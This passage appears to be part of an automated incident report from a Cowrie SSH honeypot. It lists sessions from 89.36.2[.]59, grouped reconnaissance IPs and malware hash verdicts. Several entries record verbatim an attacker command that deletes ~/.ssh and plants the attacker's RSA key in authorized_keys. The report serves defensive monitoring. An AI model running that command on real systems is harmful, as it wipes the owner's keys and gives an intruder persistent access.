|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:30 |
| **Last Seen** | 2026-04-09 04:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:30:01` | `cowrie.session.connect` |
| `2026-04-09 04:30:01` | `cowrie.client.version` |
| `2026-04-09 04:30:01` | `cowrie.client.kex` |
| `2026-04-09 04:30:02` | `cowrie.login.success` |
| `2026-04-09 04:30:02` | `cowrie.session.params` |
| `2026-04-09 04:30:02` | `cowrie.command.input` |
| `2026-04-09 04:30:02` | `cowrie.command.failed` |
| `2026-04-09 04:30:03` | `cowrie.log.closed` |
| `2026-04-09 04:30:03` | `cowrie.session.params` |
| `2026-04-09 04:30:03` | `cowrie.command.input` |
| `2026-04-09 04:30:03` | `cowrie.session.file_download` |
| `2026-04-09 04:30:03` | `cowrie.log.closed` |
| `2026-04-09 04:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cc2aa6dc23a

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:30 |
| **Last Seen** | 2026-04-09 04:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:30:06` | `cowrie.session.connect` |
| `2026-04-09 04:30:06` | `cowrie.client.version` |
| `2026-04-09 04:30:06` | `cowrie.client.kex` |
| `2026-04-09 04:30:07` | `cowrie.login.success` |
| `2026-04-09 04:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d78b50be9e05

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:35 |
| **Last Seen** | 2026-04-09 04:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:35:52` | `cowrie.session.connect` |
| `2026-04-09 04:35:52` | `cowrie.client.version` |
| `2026-04-09 04:35:52` | `cowrie.client.kex` |
| `2026-04-09 04:35:52` | `cowrie.login.success` |
| `2026-04-09 04:35:53` | `cowrie.session.params` |
| `2026-04-09 04:35:53` | `cowrie.command.input` |
| `2026-04-09 04:35:53` | `cowrie.command.failed` |
| `2026-04-09 04:35:53` | `cowrie.log.closed` |
| `2026-04-09 04:35:53` | `cowrie.session.params` |
| `2026-04-09 04:35:53` | `cowrie.command.input` |
| `2026-04-09 04:35:54` | `cowrie.session.file_download` |
| `2026-04-09 04:35:54` | `cowrie.log.closed` |
| `2026-04-09 04:35:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ebd45136ca6

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:35 |
| **Last Seen** | 2026-04-09 04:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:35:56` | `cowrie.session.connect` |
| `2026-04-09 04:35:56` | `cowrie.client.version` |
| `2026-04-09 04:35:56` | `cowrie.client.kex` |
| `2026-04-09 04:35:57` | `cowrie.login.success` |
| `2026-04-09 04:35:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-170a10aa0849

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:38 |
| **Last Seen** | 2026-04-09 04:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:38:47` | `cowrie.session.connect` |
| `2026-04-09 04:38:47` | `cowrie.client.version` |
| `2026-04-09 04:38:47` | `cowrie.client.kex` |
| `2026-04-09 04:38:48` | `cowrie.login.success` |
| `2026-04-09 04:38:48` | `cowrie.session.params` |
| `2026-04-09 04:38:48` | `cowrie.command.input` |
| `2026-04-09 04:38:48` | `cowrie.command.failed` |
| `2026-04-09 04:38:48` | `cowrie.log.closed` |
| `2026-04-09 04:38:49` | `cowrie.session.params` |
| `2026-04-09 04:38:49` | `cowrie.command.input` |
| `2026-04-09 04:38:49` | `cowrie.session.file_download` |
| `2026-04-09 04:38:49` | `cowrie.log.closed` |
| `2026-04-09 04:38:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af10fdc3d101

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:38 |
| **Last Seen** | 2026-04-09 04:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:38:51` | `cowrie.session.connect` |
| `2026-04-09 04:38:51` | `cowrie.client.version` |
| `2026-04-09 04:38:51` | `cowrie.client.kex` |
| `2026-04-09 04:38:52` | `cowrie.login.success` |
| `2026-04-09 04:38:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7ce42577a9b

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:41 |
| **Last Seen** | 2026-04-09 04:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:41:51` | `cowrie.session.connect` |
| `2026-04-09 04:41:51` | `cowrie.client.version` |
| `2026-04-09 04:41:52` | `cowrie.client.kex` |
| `2026-04-09 04:41:52` | `cowrie.login.success` |
| `2026-04-09 04:41:53` | `cowrie.session.params` |
| `2026-04-09 04:41:53` | `cowrie.command.input` |
| `2026-04-09 04:41:53` | `cowrie.command.failed` |
| `2026-04-09 04:41:53` | `cowrie.log.closed` |
| `2026-04-09 04:41:53` | `cowrie.session.params` |
| `2026-04-09 04:41:53` | `cowrie.command.input` |
| `2026-04-09 04:41:54` | `cowrie.session.file_download` |
| `2026-04-09 04:41:54` | `cowrie.log.closed` |
| `2026-04-09 04:41:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5552732adfc3

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:41 |
| **Last Seen** | 2026-04-09 04:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:41:56` | `cowrie.session.connect` |
| `2026-04-09 04:41:56` | `cowrie.client.version` |
| `2026-04-09 04:41:56` | `cowrie.client.kex` |
| `2026-04-09 04:41:57` | `cowrie.login.success` |
| `2026-04-09 04:41:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdfb18d2e499

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:43 |
| **Last Seen** | 2026-04-09 04:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:43:19` | `cowrie.session.connect` |
| `2026-04-09 04:43:19` | `cowrie.client.version` |
| `2026-04-09 04:43:20` | `cowrie.client.kex` |
| `2026-04-09 04:43:20` | `cowrie.login.success` |
| `2026-04-09 04:43:21` | `cowrie.session.params` |
| `2026-04-09 04:43:21` | `cowrie.command.input` |
| `2026-04-09 04:43:21` | `cowrie.command.failed` |
| `2026-04-09 04:43:21` | `cowrie.log.closed` |
| `2026-04-09 04:43:21` | `cowrie.session.params` |
| `2026-04-09 04:43:21` | `cowrie.command.input` |
| `2026-04-09 04:43:21` | `cowrie.session.file_download` |
| `2026-04-09 04:43:21` | `cowrie.log.closed` |
| `2026-04-09 04:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67fea7a1aa87

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:43 |
| **Last Seen** | 2026-04-09 04:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:43:24` | `cowrie.session.connect` |
| `2026-04-09 04:43:24` | `cowrie.client.version` |
| `2026-04-09 04:43:24` | `cowrie.client.kex` |
| `2026-04-09 04:43:25` | `cowrie.login.success` |
| `2026-04-09 04:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba0ed4df3fc7

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:44 |
| **Last Seen** | 2026-04-09 04:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:44:48` | `cowrie.session.connect` |
| `2026-04-09 04:44:48` | `cowrie.client.version` |
| `2026-04-09 04:44:48` | `cowrie.client.kex` |
| `2026-04-09 04:44:49` | `cowrie.login.success` |
| `2026-04-09 04:44:49` | `cowrie.session.params` |
| `2026-04-09 04:44:49` | `cowrie.command.input` |
| `2026-04-09 04:44:49` | `cowrie.command.failed` |
| `2026-04-09 04:44:49` | `cowrie.log.closed` |
| `2026-04-09 04:44:50` | `cowrie.session.params` |
| `2026-04-09 04:44:50` | `cowrie.command.input` |
| `2026-04-09 04:44:50` | `cowrie.session.file_download` |
| `2026-04-09 04:44:50` | `cowrie.log.closed` |
| `2026-04-09 04:44:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6241d955189b

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:44 |
| **Last Seen** | 2026-04-09 04:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:44:52` | `cowrie.session.connect` |
| `2026-04-09 04:44:52` | `cowrie.client.version` |
| `2026-04-09 04:44:52` | `cowrie.client.kex` |
| `2026-04-09 04:44:53` | `cowrie.login.success` |
| `2026-04-09 04:44:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bafcfc0a59fc

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:46 |
| **Last Seen** | 2026-04-09 04:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:46:19` | `cowrie.session.connect` |
| `2026-04-09 04:46:19` | `cowrie.client.version` |
| `2026-04-09 04:46:19` | `cowrie.client.kex` |
| `2026-04-09 04:46:20` | `cowrie.login.success` |
| `2026-04-09 04:46:20` | `cowrie.session.params` |
| `2026-04-09 04:46:20` | `cowrie.command.input` |
| `2026-04-09 04:46:20` | `cowrie.command.failed` |
| `2026-04-09 04:46:20` | `cowrie.log.closed` |
| `2026-04-09 04:46:21` | `cowrie.session.params` |
| `2026-04-09 04:46:21` | `cowrie.command.input` |
| `2026-04-09 04:46:21` | `cowrie.session.file_download` |
| `2026-04-09 04:46:21` | `cowrie.log.closed` |
| `2026-04-09 04:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d95c44beeb60

| Field | Detail |
|---|---|
| **Source IP** | `89.36.2[.]59` |
| **First Seen** | 2026-04-09 04:46 |
| **Last Seen** | 2026-04-09 04:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 04:46:23` | `cowrie.session.connect` |
| `2026-04-09 04:46:23` | `cowrie.client.version` |
| `2026-04-09 04:46:24` | `cowrie.client.kex` |
| `2026-04-09 04:46:24` | `cowrie.login.success` |
| `2026-04-09 04:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.36.2[.]59` to AbuseIPDB if not already reported
- [ ] Block `89.36.2[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `211.105.129[.]57` | **25** | 2026-04-09 02:29 | 2026-04-09 03:18 | 0m | 24 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `89.36.2[.]59` | **25** | 2026-04-09 04:11 | 2026-04-09 04:47 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `180.93.172[.]213` | **8** | 2026-04-09 02:01 | 2026-04-09 02:13 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `147.45.145[.]178` | **5** | 2026-04-09 02:02 | 2026-04-09 02:25 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `3.132.26[.]232` | **5** | 2026-04-09 03:20 | 2026-04-09 03:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | **4** | 2026-04-09 05:32 | 2026-04-09 05:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `192.241.179[.]235` | **2** | 2026-04-09 02:09 | 2026-04-09 02:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.163.32[.]168` | **2** | 2026-04-09 03:14 | 2026-04-09 03:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `48.214.144[.]135` | **2** | 2026-04-09 03:27 | 2026-04-09 03:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `165.22.184[.]62` | 1 | 2026-04-09 04:26 | 2026-04-09 04:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.56.235[.]140` | 1 | 2026-04-09 03:39 | 2026-04-09 03:40 | 62s | 1 | `T1110.001` | 🟢 LOW |
| `35.229.218[.]65` | 1 | 2026-04-09 04:21 | 2026-04-09 04:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `39.129.209[.]216` | 1 | 2026-04-09 02:08 | 2026-04-09 02:09 | 12s | 0 | `T1592` | 🟢 LOW |
| `95.231.249[.]182` | 1 | 2026-04-09 04:10 | 2026-04-09 04:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
